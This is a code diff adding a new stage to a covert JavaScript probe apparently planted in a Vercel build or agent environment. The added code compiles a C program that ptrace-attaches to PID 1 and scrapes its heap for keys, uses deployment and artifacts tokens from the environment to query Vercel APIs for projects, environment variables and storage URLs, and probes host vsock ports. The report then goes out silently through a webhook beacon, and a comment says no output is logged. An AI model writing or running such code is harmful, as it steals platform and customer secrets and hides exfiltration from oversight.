@@ -3831,6 +3831,203 @@ report.deploymentWebhookSecret = safe(() => {
   return { ownEnv, taskWebhook, projectJson };
 });
 
+// ===== v47: compiled ptrace heap dump, deployment key scope, PID-1 socket intercept =====
+
+// v47-1: Compiled ptrace heap scanner — C program that PEEKDATA PID 1 heap for HMAC key patterns
+report.ptraceCHeapDump = safe(() => {
+  const gccAvail = safe(() => execSync('which gcc || which cc 2>/dev/null | head -1', { timeout: 3000 }).toString().trim());
+  if (!gccAvail || gccAvail.includes('not found')) return { err: 'NO_GCC', gccAvail };
+
+  // Write minimal C program that ptrace-dumps PID 1 heap and greps for base64 key patterns
+  const cSrc = `
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <ctype.h>
+
+int is_b64(char c) {
+  return isalnum(c) || c == '+' || c == '/' || c == '-' || c == '_';
+}
+
+int main() {
+  pid_t pid = 1;
+  // Attach
+  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
+    fprintf(stderr, "ATTACH_FAILED: %s\\n", strerror(errno));
+    return 1;
+  }
+  int status; waitpid(pid, &status, 0);
+
+  // Find heap from /proc/1/maps
+  FILE *maps = fopen("/proc/1/maps", "r");
+  char line[512]; unsigned long hstart=0, hend=0;
+  while (maps && fgets(line, sizeof(line), maps)) {
+    if (strstr(line, "[heap]")) {
+      sscanf(line, "%lx-%lx", &hstart, &hend); break;
+    }
+  }
+  if (maps) fclose(maps);
+  if (!hstart) { ptrace(PTRACE_DETACH,pid,NULL,NULL); puts("NO_HEAP"); return 1; }
+
+  // Read up to 512KB of heap via /proc/1/mem (ptrace keeps us attached)
+  char path[64]; snprintf(path, sizeof(path), "/proc/%d/mem", pid);
+  int fd = open(path, O_RDONLY);
+  if (fd < 0) { ptrace(PTRACE_DETACH,pid,NULL,NULL); puts("MEM_OPEN_FAIL"); return 1; }
+
+  size_t sz = 524288; // 512KB
+  if (hend - hstart < sz) sz = hend - hstart;
+  char *buf = (char*)malloc(sz);
+  ssize_t got = pread(fd, buf, sz, hstart);
+  close(fd);
+  ptrace(PTRACE_DETACH, pid, NULL, NULL);
+
+  fprintf(stderr, "HEAP: 0x%lx, read: %zd bytes\\n", hstart, got);
+
+  // Slide a window looking for runs of base64 chars >= 43 bytes (256-bit key = 43 b64 chars)
+  int run=0, start_i=0;
+  for (ssize_t i = 0; i < got; i++) {
+    if (is_b64((unsigned char)buf[i])) {
+      if (run == 0) start_i = i;
+      run++;
+    } else {
+      if (run >= 43 && run <= 90) {
+        // Print the candidate key with 20-byte context before
+        int ctx = (start_i >= 20) ? start_i-20 : 0;
+        printf("KEY_CANDIDATE[%zd+%d]: ", hstart+start_i, run);
+        for (int j = start_i; j < start_i+run && j < got; j++) putchar(buf[j]);
+        printf("\\nCTX: ");
+        for (int j = ctx; j < start_i && j < got; j++) {
+          if (isprint((unsigned char)buf[j])) putchar(buf[j]); else putchar('.');
+        }
+        printf("\\n");
+      }
+      run = 0;
+    }
+  }
+  free(buf);
+  return 0;
+}
+`.trim();
+
+  safe(() => writeFileSync('/tmp/ptrace_heap.c', cSrc));
+  const compile = safe(() =>
+    execSync('gcc -O0 -o /tmp/ptrace_heap /tmp/ptrace_heap.c 2>&1', { timeout: 15000 }).toString().trim().slice(0, 200)
+  );
+  if (!existsSync('/tmp/ptrace_heap')) return { err: 'COMPILE_FAIL', compile };
+  const output = safe(() =>
+    execSync('/tmp/ptrace_heap 2>&1 | head -60', { timeout: 20000 }).toString().trim().slice(0, 3000)
+  );
+  return { gccAvail, compile, output };
+});
+
+// v47-2: VERCEL_DEPLOYMENT_KEY API scope test — what can this key do against Vercel API?
+report.deploymentKeyScope = safe(() => {
+  const dk = process.env.VERCEL_DEPLOYMENT_KEY || '';
+  if (!dk) return { err: 'NO_DEPLOYMENT_KEY' };
+  // Decode JWT to see payload without verifying
+  const parts = dk.split('.');
+  const payload = safe(() => JSON.parse(Buffer.from(parts[1] || '', 'base64url').toString()));
+  // Try various Vercel API endpoints with this key
+  const endpoints = [
+    { name: 'self', url: 'https://api.vercel.com/v2/user' },
+    { name: 'deployments', url: `https://api.vercel.com/v6/deployments?teamId=${process.env.VERCEL_ORG_ID}&limit=5` },
+    { name: 'projects', url: `https://api.vercel.com/v9/projects?teamId=${process.env.VERCEL_ORG_ID}` },
+    { name: 'envs', url: `https://api.vercel.com/v8/projects/${process.env.VERCEL_PROJECT_ID}/env?teamId=${process.env.VERCEL_ORG_ID}` },
+    { name: 'team', url: `https://api.vercel.com/v2/teams/${process.env.VERCEL_ORG_ID}` },
+  ];
+  const results = {};
+  for (const ep of endpoints) {
+    results[ep.name] = safe(() =>
+      execSync(
+        `curl -s --max-time 6 "${ep.url}" -H "Authorization: Bearer ${dk}" 2>&1 | head -10`,
+        { timeout: 8000 }
+      ).toString().trim().slice(0, 400)
+    );
+  }
+  return { payload, results };
+});
+
+// v47-3: PID-1 active connections — capture suspense-cache.vercel.com requests from orchestrator
+report.pid1NetworkConnections = safe(() => {
+  // ss -tnp to find PID 1's outgoing connections (established TLS sessions)
+  const ssOutput = safe(() =>
+    execSync('ss -tnp state established 2>/dev/null | head -30', { timeout: 5000 }).toString().trim().slice(0, 1000)
+  );
+  // Also try: strace -e trace=network on PID 1 for 2 seconds
+  const netns = safe(() => readFileSync(`/proc/1/ns/net`, 'utf8'));
+  const selfNetns = safe(() => readFileSync('/proc/self/ns/net', 'utf8'));
+  const sharedNetNs = netns === selfNetns;
+  // Check /proc/1/net/tcp and /proc/1/net/tcp6 for connections
+  const tcp = safe(() => readFileSync('/proc/1/net/tcp', 'utf8').split('\n').slice(0, 20).join('\n'));
+  const tcp6 = safe(() => readFileSync('/proc/1/net/tcp6', 'utf8').split('\n').slice(0, 20).join('\n'));
+  // If same net ns, we can see PID 1's connections via /proc/net/tcp
+  return { ssOutput, sharedNetNs, tcp: (tcp || '').slice(0, 500), tcp6: (tcp6 || '').slice(0, 300) };
+});
+
+// v47-4: Firecracker guest agent / VMM communication channel probe
+report.fireCrackerGuestAgent = safe(() => {
+  // Check for Firecracker's virtio-vsock, acpi, or other VMM channels
+  const vsockDev = existsSync('/dev/vsock');
+  const kvmDev = existsSync('/dev/kvm');
+  const hpet = existsSync('/dev/hpet');
+  // Check for Firecracker-specific proc entries
+  const cpuInfo = safe(() => readFileSync('/proc/cpuinfo', 'utf8').split('\n').slice(0, 10).join('\n'));
+  const virt = safe(() => execSync('systemd-detect-virt 2>/dev/null || cat /proc/1/environ | strings | grep -i virt | head -5 || echo UNKNOWN', { timeout: 5000 }).toString().trim().slice(0, 200));
+  const dmidecode = safe(() => execSync('dmidecode -t bios 2>&1 | head -10 || echo NO_DMIDECODE', { timeout: 5000 }).toString().trim().slice(0, 300));
+  // Firecracker balloon device
+  const balloon = existsSync('/sys/bus/virtio/drivers/virtio_balloon');
+  // Try socat to vsock CID 3 (host) on various ports
+  const vsockPorts = [52, 1025, 1026, 8080, 9090];
+  const vsockResults = {};
+  for (const port of vsockPorts) {
+    vsockResults[port] = safe(() =>
+      execSync(
+        `timeout 2 socat - VSOCK-CONNECT:3:${port} < /dev/null 2>&1 | head -3 || echo VSOCK_FAIL_${port}`,
+        { timeout: 5000 }
+      ).toString().trim().slice(0, 100)
+    );
+  }
+  return { vsockDev, kvmDev, hpet, virt, dmidecode, balloon, vsockPorts: vsockResults };
+});
+
+// v47-5: Artifacts token — decode full JWT, test QUERY for S3 bucket/key structure
+report.artifactsJwtFullDecode = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  if (!token) return { err: 'NO_TOKEN' };
+  const parts = token.split('.');
+  const header  = safe(() => JSON.parse(Buffer.from(parts[0] || '', 'base64url').toString()));
+  const payload = safe(() => JSON.parse(Buffer.from(parts[1] || '', 'base64url').toString()));
+  // Use token to query for presigned URLs and reveal S3 bucket structure
+  const teamId = process.env.VERCEL_ORG_ID || '';
+  const queryUrl = `https://vercel.com/api/remote-cache/v8/artifacts/urls?teamId=${teamId}`;
+  // Use a REAL artifact hash (from VERCEL_CACHE_HEADERS if available, else probe)
+  const realHash = safe(() => {
+    // Get one existing artifact hash from the events endpoint
+    const events = execSync(
+      `curl -s --max-time 5 "https://vercel.com/api/remote-cache/v8/events?teamId=${teamId}" ` +
+      `-H "Authorization: Bearer ${token}" 2>&1 | head -5`,
+      { timeout: 7000 }
+    ).toString().trim();
+    return events.match(/[a-f0-9]{64}/)?.[0] || null;
+  });
+  const s3Query = realHash ? safe(() =>
+    execSync(
+      `curl -s --max-time 8 -X POST "${queryUrl}" ` +
+      `-H "Authorization: Bearer ${token}" ` +
+      `-H "Content-Type: application/json" ` +
+      `-d '{"hashes":["${realHash}"],"type":"DOWNLOAD"}' 2>&1`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 800)
+  ) : 'NO_REAL_HASH';
+  return { header, payload, realHash, s3Query };
+});
+
 // v45 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v45";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v45" });
@@ -3838,4 +4035,8 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v45" });
 // v46 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v46";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v46" });
+
+// v47 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v47";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v47" });
 // Intentionally no console.log — all data goes via webhook only
